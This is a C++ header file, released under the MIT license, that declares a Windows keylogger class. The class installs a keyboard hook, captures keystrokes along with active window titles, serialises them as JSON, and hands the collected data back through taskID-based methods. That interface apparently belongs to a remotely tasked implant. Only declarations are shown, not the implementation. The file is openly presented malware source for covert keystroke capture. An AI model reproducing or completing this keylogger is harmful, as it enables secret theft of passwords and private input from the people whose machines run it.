/*
MIT License

Copyright (c) 2025 solveditnpc

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.
*/

#ifndef KEYLOGGER_H
#define KEYLOGGER_H

#include <windows.h>
#include <stdio.h>
#include <string>

#pragma comment(lib, "user32.lib")

// Define a struct to hold the keylogger state
struct KeyloggerState
{
    bool isRunning;
    std::string data;
};

class Keylogger
{
public:
    int keylog_start(const int &taskID);
    TaskResponse<std::string> get_keylog_data(const int &taskID);

private:
    static LRESULT CALLBACK hook_proc(int code, WPARAM wParam, LPARAM lParam);
    static Keylogger *active_instance;

    bool first_json_entry = true;
    bool logging_enabled = false;
    HHOOK keyboard_hook = NULL;
    DWORD hook_thread_id = 0;
    std::string current_window = "";
    std::string keylog_data = "[";
    HWND last_window = NULL;

    std::string escape_json(const std::string &value);
    void append_json_event(const std::string &type, const std::string &value,
                           const std::string &window);
    std::string get_active_window_title();
    int keylog_stop();
};

#endif